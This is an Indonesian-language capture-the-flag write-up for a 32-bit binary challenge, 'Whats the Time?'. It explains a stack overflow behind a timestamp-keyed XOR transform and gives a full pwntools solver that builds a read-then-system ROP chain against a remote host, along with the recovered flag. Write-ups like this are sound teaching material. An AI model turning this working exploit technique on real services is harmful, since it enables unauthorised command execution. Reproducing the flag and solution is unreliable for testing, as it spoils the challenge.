# Whats the Time?

## Ringkasan

Challenge ini adalah binary exploitation 32-bit dengan pola `ret2win`/ROP sederhana, tetapi input user tidak dipakai secara langsung. Semua byte input terlebih dulu di-XOR dengan nilai berbasis waktu, lalu hasilnya di-`memcpy` ke buffer stack yang terlalu kecil. Vulnerability utamanya adalah:

- `stack buffer overflow`
- tanpa canary
- non-PIE
- NX aktif

Karena ada fungsi `win()`, target awal yang paling natural adalah overwrite return address ke `win`. Itu memang cukup untuk dapat shell lokal. Namun pada remote, shell hasil `system("/bin/sh")` dari `win()` tidak cukup stabil untuk ambil flag secara nyaman. Solusi final yang paling bersih adalah ROP:

1. `read(0, .bss, 0x20)`
2. `system(.bss)`

Stage kedua mengirim string `cat flag.txt\x00`, sehingga binary sendiri yang mengeksekusinya via `system()`.

Flag:

```text
texsaw{7h4nk_u_f0r_y0ur_71m3}
```

## File

- Binary: `whatsthetime`
- Solver final: `solve.py`

## Initial Recon

### Identifikasi binary

Command:

```bash
file whatsthetime
checksec --file=whatsthetime
```

Hasil penting:

- ELF 32-bit
- dynamically linked
- not stripped
- Partial RELRO
- No canary
- NX enabled
- No PIE

Implikasinya:

- alamat fungsi di binary statis dan bisa dipakai langsung
- stack smashing memungkinkan karena tidak ada canary
- shellcode di stack tidak cocok karena NX aktif
- ret2win / ROP adalah jalur yang tepat

## Recon String dan Simbol

Command:

```bash
strings -a -n 4 whatsthetime
readelf -Ws whatsthetime
```

Temuan penting:

- ada fungsi `win`
- ada fungsi `read_user_input`
- ada string:

```text
Executing shell
/bin/sh
I think one of my watch hands fell off!
Currently the time is: %s
oops wrong command
```

Begitu terlihat ada `win` dan `/bin/sh`, hipotesis awal langsung:

- binary kemungkinan memiliki jalur `ret2win`
- overflow mungkin terjadi di `read_user_input`

## Static Analysis

### Disassembly fungsi penting

Command:

```bash
objdump -Mintel -d whatsthetime | sed -n '/<win>:/,/^$/p;/<read_user_input>:/,/^$/p;/<main>:/,/^$/p'
```

### Fungsi `win()`

Dari disassembly terlihat:

```c
printf("Executing shell %s...", "/bin/sh");
system("/bin/sh");
printf("oops wrong command");
```

Artinya jika EIP bisa diarahkan ke `win`, binary akan menjalankan `/bin/sh`.

### Fungsi `main()`

`main()` melakukan hal berikut:

1. ambil current time lewat `time(0)`
2. membulatkan ke menit penuh
3. menampilkan waktu via `ctime`
4. memanggil `read_user_input(rounded_time)`

Poin yang penting adalah nilai waktu itu juga dipakai sebagai argumen ke `read_user_input`.

### Fungsi `read_user_input(int key)`

Bagian paling penting dari challenge ada di sini.

Secara logika, fungsi ini:

1. `malloc(0xa0)`
2. `read(0, heap_buf, 0xa0)`
3. untuk setiap blok 4 byte:
   - XOR byte input dengan byte-byte dari integer `key`
   - setelah 4 byte, `key++`
4. `memcpy(stack_buf, heap_buf, read_len)`
5. `write(1, stack_buf, 0x28)`

Pseudo-code sederhananya:

```c
void read_user_input(int key) {
    char stack_buf[0x40];
    char *heap_buf = malloc(0xa0);
    int n = read(0, heap_buf, 0xa0);

    for (int i = 0; i < n; i += 4) {
        for (int j = 0; j < 4 && i + j < n; j++) {
            heap_buf[i + j] ^= (key >> (8 * j)) & 0xff;
        }
        key++;
    }

    memcpy(stack_buf, heap_buf, n);
    write(1, stack_buf, 0x28);
}
```

### Vulnerability

Masalah utamanya:

```c
char stack_buf[0x40];
memcpy(stack_buf, heap_buf, n);
```

`n` berasal langsung dari `read()`, maksimum `0xa0`, sedangkan buffer stack hanya `0x40`. Jadi ada overflow yang menginjak:

- saved EBP
- saved RET

Ini vulnerability finalnya.

## Kendala Input Encoding

Kalau langsung kirim payload overflow biasa, EIP tidak akan menjadi nilai yang kita inginkan, karena input terlebih dulu diubah:

```c
payload[i+j] ^= byte_j_dari_key
```

Jadi payload yang kita kirim harus **diencode dulu** supaya setelah di-XOR oleh program, hasil akhirnya menjadi payload yang kita mau di stack.

Skema encoding:

- blok 4 byte pertama di-XOR dengan `key`
- blok 4 byte kedua di-XOR dengan `key + 1`
- blok 4 byte ketiga di-XOR dengan `key + 2`
- dst

Nilai `key` sendiri adalah timestamp yang dibulatkan ke menit penuh, dan nilainya dibocorkan ke kita dalam format string:

```text
Currently the time is: Fri Mar 27 18:30:00 2026
```

Karena string waktu remote cocok dengan epoch UTC saat diuji, solver final cukup menginterpretasikan string itu sebagai `UTC`, lalu convert ke timestamp.

## Dynamic Analysis

### Menemukan offset EIP

Karena input di-transform, cyclic pattern biasa tidak bisa langsung dipakai mentah. Pattern harus:

1. dibuat dulu
2. lalu di-encode dengan skema XOR yang sama
3. baru dikirim ke program

Setelah itu crash diambil dengan `gdb`.

Command pendekatan:

```bash
gdb -q ./whatsthetime -batch \
  -ex 'run < gdb_input.bin' \
  -ex 'info reg eip esp ebp' \
  -ex 'x/12wx $esp'
```

Crash penting:

```text
eip 0x61616172
ebp 0x61616171
```

Dengan `cyclic_find`:

```python
cyclic_find(0x61616172) == 68
```

Jadi offset ke saved return address adalah:

```text
68
```

## Eksploitasi Awal: Ret2win

Payload paling awal:

```python
b"A" * 68 + p32(win)
```

Setelah di-encode dengan key yang benar, ini valid dan berhasil memanggil `win()` pada binary lokal.

Namun di remote, pendekatan `ret2win -> system("/bin/sh")` menghasilkan shell yang tidak cukup nyaman untuk interaksi lanjutan. Respons yang muncul konsisten menunjukkan `win()` terpanggil:

```text
Executing shell /bin/sh...
```

Tetapi command lanjutan tidak selalu reliable untuk dump flag. Jadi exploit digeser ke ROP yang lebih deterministic.

## Strategi Final: ROP `read` lalu `system`

Karena binary non-PIE, kita bisa pakai alamat PLT secara langsung:

- `read@plt`
- `system@plt`
- buffer writable di `.bss`

### Ide

Stage 1 overflow membuat chain berikut:

```text
read(0, .bss, 0x20)
system(.bss)
```

Setelah ROP stage pertama jalan, kita kirim stage kedua:

```text
cat flag.txt\x00
```

Hasilnya:

- `read()` menyimpan string command ke `.bss`
- kontrol kembali ke `system(.bss)`
- binary menjalankan `system("cat flag.txt")`
- flag tercetak langsung ke koneksi

### Alamat penting

Didapat dari ELF:

```python
read_plt = elf.plt["read"]
system_plt = elf.plt["system"]
bss = elf.bss() + 0x100
```

Offset `+0x100` hanya untuk memberi ruang aman di area writable.

### Bentuk ROP chain

Untuk i386 cdecl, layout stack:

```text
[padding 68 byte]
[read@plt]
[system@plt]    <- return address setelah read selesai
[fd = 0]
[buf = .bss]
[count = 0x20]
[dummy_ret]
[arg_system = .bss]
```

Secara `pwntools`:

```python
rop = flat(
    b"A" * 68,
    read_plt,
    system_plt,
    0,
    bss,
    0x20,
    0xDEADBEEF,
    bss,
)
```

`0xDEADBEEF` hanya placeholder return address setelah `system`, karena tidak perlu lagi.

## Solver Final

Isi solver final ada di [solve.py](/home/nata/ctf/texcaw/pwn/2/solve.py).

Versi inti exploit:

```python
from pwn import *
from datetime import datetime, timezone

HOST = "143.198.163.4"
PORT = 3000

elf = ELF("./whatsthetime", checksec=False)
READ_PLT = elf.plt["read"]
SYSTEM_PLT = elf.plt["system"]
BSS = elf.bss() + 0x100
OFFSET = 68


def encode(data: bytes, base: int) -> bytes:
    out = bytearray(data)
    key = base
    for i in range(0, len(out), 4):
        for j in range(4):
            if i + j < len(out):
                out[i + j] ^= (key >> (8 * j)) & 0xFF
        key += 1
    return bytes(out)


io = remote(HOST, PORT)
io.recvuntil(b"Currently the time is: ")
line = io.recvline().decode().strip()
base = int(
    datetime.strptime(line, "%a %b %d %H:%M:%S %Y")
    .replace(tzinfo=timezone.utc)
    .timestamp()
)

rop = flat(
    b"A" * OFFSET,
    READ_PLT,
    SYSTEM_PLT,
    0,
    BSS,
    0x20,
    0xDEADBEEF,
    BSS,
)

io.send(encode(rop, base))
io.recvn(40)
io.send(b"cat flag.txt\x00")
print(io.recvrepeat(2).decode(errors="ignore"))
```

## Kenapa `io.recvn(40)`?

Di akhir `read_user_input`, program melakukan:

```c
write(1, stack_buf, 0x28);
```

Artinya sebelum ROP chain jalan penuh, kita akan menerima 40 byte pertama dari payload yang sudah terdekripsi di stack. Karena itu solver membuang tepat `0x28` byte output tersebut dulu:

```python
io.recvn(40)
```

Setelah output dummy itu habis, stage kedua baru dikirim.

## Verifikasi Lokal

ROP yang sama diuji lokal dengan mengganti stage dua menjadi command sederhana:

```text
echo PWNED
```

Hasil lokal menunjukkan command berhasil dieksekusi via `system(.bss)`, sehingga primitive final sudah tervalidasi sebelum ditembak ke remote.

## Hasil Akhir

Menjalankan [solve.py](/home/nata/ctf/texcaw/pwn/2/solve.py):

```bash
source /home/nata/ctf_env/bin/activate
python solve.py
```

Output:

```text
texsaw{7h4nk_u_f0r_y0ur_71m3}
```

## Poin Penting Challenge

- Overflow ada karena `memcpy` ke stack buffer 0x40 memakai panjang `read()` yang bisa sampai 0xa0.
- Input tidak bisa dipakai mentah karena ada XOR transform berbasis timestamp.
- Timestamp justru dibocorkan langsung lewat output `ctime`, jadi encoding bisa direkonstruksi.
- `ret2win` cukup untuk bukti kontrol RIP/EIP, tetapi ROP `read -> system` lebih stabil untuk ekstraksi flag remote.

## Lessons Learned

- Kalau input di-obfuscate sebelum overflow, jangan langsung anggap offset atau payload biasa akan gagal permanen. Sering kali transform-nya justru reversible.
- Saat `system("/bin/sh")` tidak stabil di remote, lebih baik ubah primitive menjadi eksekusi command one-shot yang deterministic.
- Non-PIE + no canary pada binary kecil hampir selalu memberi jalur ROP yang sangat langsung.
